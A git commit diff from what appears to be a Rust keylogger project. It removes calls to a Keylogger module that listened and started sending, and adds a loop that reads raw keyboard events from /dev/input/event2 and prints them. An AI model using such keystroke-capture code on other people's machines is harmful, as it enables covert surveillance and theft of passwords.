ec30fb3fca0a5ae2c2e6985b30346767784cf281
Ninja-Jambon <lulul7018@gmail.com>
2024-03-20 16:08:24 +0100

    commit

--- src/main.rs
+++ src/main.rs
@@ -1,12 +1,17 @@
-mod keylogger;
-
-use keylogger::Keylogger;
+use std::fs::OpenOptions;
+use std::io::{Cursor, Read};
 
 fn main() {
-    let keylogger: Keylogger = Keylogger::new("./src/config.json");
+    let mut file_options = OpenOptions::new();
+    file_options.read(true);
+    file_options.write(false);
 
-    keylogger.listen();
-    keylogger.start_sending();
+    let mut dev_file = file_options.open("/dev/input/event2").unwrap();
 
-    loop {}
+    loop {
+        let mut packet = [0u8; 24];
+        dev_file.read_exact(&mut packet).unwrap();
+
+        println!("{:?}", packet);
+    }
 }
